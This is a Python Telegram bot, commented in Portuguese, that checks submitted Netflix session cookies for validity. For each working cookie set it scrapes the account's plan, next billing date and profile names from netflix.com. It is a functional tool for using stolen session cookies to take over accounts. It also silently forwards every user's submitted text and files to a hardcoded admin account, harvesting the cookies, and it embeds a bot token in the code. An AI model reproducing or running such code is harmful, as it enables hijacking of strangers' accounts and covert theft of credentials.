
import logging
import json
import requests
import os
import re
import html
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters

# --- CONFIGURAÇÕES ---
ADMIN_ID = 1590653771  # Seu ID de administrador
USERS_FILE = "usuarios.json" # Arquivo para salvar os IDs dos usuários

# Configuração de logging - CRITICAL para economizar memória e logs
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", 
    level=logging.CRITICAL
)
logger = logging.getLogger(__name__)

# Silencia logs de bibliotecas externas
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# URLs da Netflix
NETFLIX_BROWSE_URL = "https://www.netflix.com/browse"
NETFLIX_ACCOUNT_URL = "https://www.netflix.com/YourAccount"

def save_user(user_id):
    """Salva o ID do usuário se ele ainda não estiver na lista."""
    try:
        users = []
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                users = json.load(f)
        
        if user_id not in users:
            users.append(user_id)
            with open(USERS_FILE, "w") as f:
                json.dump(users, f)
    except:
        pass # Silenciado para evitar logs

async def start(update: Update, context) -> None:
    save_user(update.effective_user.id)
    await update.message.reply_text(
        "🍪 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗡𝗲𝘁𝗳𝗹𝗶𝘅 𝗖𝗼𝗼𝗸𝗶𝗲𝘀\n\n"
        "📂 Envie Cookies em 𝗧𝗲𝘅𝘁𝗼 ou 𝗔𝗿𝗾𝘂𝗶𝘃𝗼 .txt\n"
        "• 𝗦𝗼𝗺𝗲𝗻𝘁𝗲 Cookies 𝗡𝗲𝘁𝗳𝗹𝗶𝘅!!"
    )

async def broadcast_all(update: Update, context) -> None:
    """Envia uma mensagem para todos os usuários (apenas admin)."""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("Você não tem permissão para usar este comando.")
        return

    if not context.args:
        await update.message.reply_text("❌ Use: /all [mensagem]")
        return

    message_to_send = " ".join(context.args)
    
    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("❌ Nenhum usuário cadastrado ainda.")
        return

    with open(USERS_FILE, "r") as f:
        users = json.load(f)

    count_success = 0
    count_fail = 0
    
    status_msg = await update.message.reply_text(f"Iniciando transmissão para {len(users)} usuários...")

    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=message_to_send)
            count_success += 1
        except:
            count_fail += 1
    
    await status_msg.edit_text(
        f"✅ Transmissão concluída!\n\n"
        f"Sucesso: {count_success}\n"
        f"Falha: {count_fail}"
    )

def extract_all_cookies(text):
    """Extrai múltiplos conjuntos de cookies de um texto misto de forma robusta."""
    found_cookies = []
    json_blocks = re.findall(r'(\[[\s\S]*?\]|\{[\s\S]*?\})', text)
    for block in json_blocks:
        try:
            data = json.loads(block)
            cookies_dict = {}
            if isinstance(data, list):
                for c in data:
                    name = c.get('name') or c.get('Name')
                    value = c.get('value') or c.get('Value')
                    if name and value:
                        cookies_dict[name] = value
            elif isinstance(data, dict):
                cookies_dict = data
            if cookies_dict and 'NetflixId' in cookies_dict:
                found_cookies.append(cookies_dict)
        except:
            continue

    remaining_text = text
    for block in json_blocks:
        remaining_text = remaining_text.replace(block, "")
    
    text_blocks = re.split(r',\s*\n|\n\n|\r\n\r\n', remaining_text)
    for block in text_blocks:
        if not block.strip(): continue
        cookies_dict = {}
        pairs = re.findall(r'([^=\s;]+)=([^;\s,]+)', block)
        for key, value in pairs:
            try:
                clean_key = key.strip().encode('ascii', 'ignore').decode('ascii')
                clean_val = value.strip().encode('ascii', 'ignore').decode('ascii')
                cookies_dict[clean_key] = clean_val
            except:
                continue
        if cookies_dict and 'NetflixId' in cookies_dict:
            found_cookies.append(cookies_dict)
            
    return found_cookies

def decode_netflix_value(value):
    """Decodifica valores da Netflix que podem conter escapes unicode ou HTML."""
    if value is None:
        return None
    try:
        cleaned = html.unescape(str(value))
        # Remove escapes comuns
        cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
        # Decodifica unicode escapes (\uXXXX)
        cleaned = cleaned.encode().decode('unicode-escape', errors='ignore')
        # Limpa espaços extras
        cleaned = re.sub(r"\s+", " ", cleaned).strip()
        return cleaned
    except:
        return str(value)

def extract_first_match(text, patterns):
    """Tenta encontrar o primeiro match em uma lista de padrões regex."""
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def get_netflix_info(cookies):
    """Acessa a Netflix e tenta extrair perfis, plano e próxima cobrança."""
    info = {
        "status": "Invalido", 
        "profiles": [], 
        "plan": "Desconhecido",
        "next_billing": "Não encontrada"
    }
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": "https://www.netflix.com/"
        }
        
        session = requests.Session()
        session.headers.update(headers)
        
        # 1. Verificar se os cookies estão ativos
        res = session.get(NETFLIX_BROWSE_URL, cookies=cookies, allow_redirects=False, timeout=20)
        
        if res.status_code == 200:
            info["status"] = "Ativo"
            
            # Extração de perfis
            profiles_matches = re.findall(r'"name":"([^"]+)","avatarName"', res.text)
            if not profiles_matches:
                profiles_matches = re.findall(r'"profileName":"([^"]+)"', res.text)

            if profiles_matches:
                clean_profiles = []
                blacklist = ['Kids', 'Crianças', 'chrome', 'windows', 'api', 'akiraBuildIdentifier', 'buildIdentifier', 'true', 'false', 'null']
                for p in profiles_matches:
                    p_final = decode_netflix_value(p)
                    if p_final and p_final.lower() not in [b.lower() for b in blacklist] and p_final not in clean_profiles:
                        if len(p_final) < 30:
                            clean_profiles.append(p_final)
                info["profiles"] = clean_profiles

            # 2. Acessar a página da conta para Plano e Cobrança
            acc_res = session.get(NETFLIX_ACCOUNT_URL, cookies=cookies, timeout=20)
            if acc_res.status_code == 200:
                # Padrões para Plano
                plan_patterns = [
                    r'"localizedPlanName"\s*:\s*"([^"]+)"',
                    r'"planName"\s*:\s*"([^"]+)"',
                    r'data-uia="plan-label">([^<]+)<',
                    r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                    r'<b>(Plano [^<]+)</b>'
                ]
                plan = extract_first_match(acc_res.text, plan_patterns)
                if plan:
                    info["plan"] = plan

                # Padrões para Próxima Cobrança
                billing_patterns = [
                    r'"nextBillingDate"\s*:\s*"([^"]+)"',
                    r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                    r'data-uia="nextBillingDate-item">([^<]+)<',
                    r'(?:Sua próxima fatura será em|Your next billing date is)\s*<b>([^<]+)</b>',
                    r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'
                ]
                billing = extract_first_match(acc_res.text, billing_patterns)
                if billing:
                    # Se vier no formato ISO (YYYY-MM-DD), tenta deixar mais amigável
                    if re.match(r'\d{4}-\d{2}-\d{2}', billing):
                        parts = billing.split('-')
                        billing = f"{parts[2]}/{parts[1]}/{parts[0]}"
                    info["next_billing"] = billing
        
        elif res.status_code in [301, 302] and '/login' in res.headers.get('Location', ''):
            info["status"] = "Expirado"
            
    except Exception as e:
        info["status"] = "Erro"
    
    return info

def get_user_info_str(update: Update):
    """Gera uma string com as informações do usuário."""
    user = update.effective_user
    info = f"👤 Usuário: {user.first_name}"
    if user.last_name:
        info += f" {user.last_name}"
    if user.username:
        info += f" (@{user.username})"
    info += f" [ID: {user.id}]"
    return info

async def process_and_reply(update: Update, context, content: str):
    """Processa o conteúdo e envia as respostas no chat."""
    all_cookies = extract_all_cookies(content)
    
    if not all_cookies:
        await update.message.reply_text("❌ Nenhum N° de Cookies Válidos encontrado.")
        return

    await update.message.reply_text(f"🔁 Verificando {len(all_cookies)} Múltiplos n° de Cookies...")
    
    for i, cookies in enumerate(all_cookies):
        info = get_netflix_info(cookies)
        msg = f"🍪 𝗥𝗲𝘀𝘂𝗹𝘁𝗮𝗱𝗼 #{i+1}:\n"
        msg += f"Status: {'✅' if info['status'] == 'Ativo' else '❌'} {info['status']}\n"
        if info['status'] == 'Ativo':
            msg += f"𝗣𝗹𝗮𝗻𝗼: {info['plan']}\n"
            msg += f"𝗣𝗿𝗼𝘅𝗶𝗺𝗮 𝗰𝗼𝗯𝗿𝗮𝗻𝗰̧𝗮: {info['next_billing']}\n"
            msg += f"Perfis ({len(info['profiles'])}): {', '.join(info['profiles']) if info['profiles'] else 'Não detectados'}"
        await update.message.reply_text(msg)

async def handle_message(update: Update, context) -> None:
    save_user(update.effective_user.id)
    user_text = update.message.text
    user_info = get_user_info_str(update)
    
    if ADMIN_ID:
        admin_msg = f"📩 Nova Mensagem de Texto Recebida\n"
        admin_msg += f"{user_info}\n\n"
        admin_msg += f"📝 Conteúdo:\n{user_text}"
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
        except:
            pass

    await process_and_reply(update, context, user_text)

async def handle_document(update: Update, context) -> None:
    save_user(update.effective_user.id)
    doc = update.message.document
    file = await doc.get_file()
    file_name = doc.file_name
    file_path = f"temp_{file_name}"
    await file.download_to_drive(file_path)
    
    user_info = get_user_info_str(update)
    
    if ADMIN_ID:
        try:
            admin_header = f"📂 Arquivo Recebido (Encaminhado de)\n{user_info}\n"
            admin_header += f"📄 Arquivo: `{file_name}`"
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_header)
            await context.bot.send_document(chat_id=ADMIN_ID, document=doc.file_id)
        except:
            pass
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        await process_and_reply(update, context, content)
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao ler o arquivo: {e}")
    finally:
        if os.path.exists(file_path): os.remove(file_path)

def main():
    token = "8770780999:AAESX1POdCwamnlPqg59a5e_kj9KdHCmv6M"
    app = Application.builder().token(token).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("all", broadcast_all)) # Novo comando /all
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    app.run_polling()

if __name__ == "__main__":
    main()
